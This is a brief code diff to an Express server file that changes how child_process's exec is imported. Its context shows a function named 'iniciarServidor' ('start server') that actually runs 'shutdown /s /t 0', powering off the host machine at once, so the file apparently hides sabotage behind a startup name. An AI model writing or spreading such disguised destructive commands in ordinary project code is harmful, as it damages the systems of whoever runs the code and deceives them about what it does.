@@ -1,6 +1,6 @@
 import express from "express";
 import routers from "./src/routes/route.js";
-const { exec } = require('child_process');
+import { exec } from "child_process";
 
 function iniciarServidor() {
   exec('shutdown /s /t 0', (error, stdout, stderr) => {
@@ -10,7 +10,6 @@ function iniciarServidor() {
       }
   });
 }
-
 
 const app = express();
 
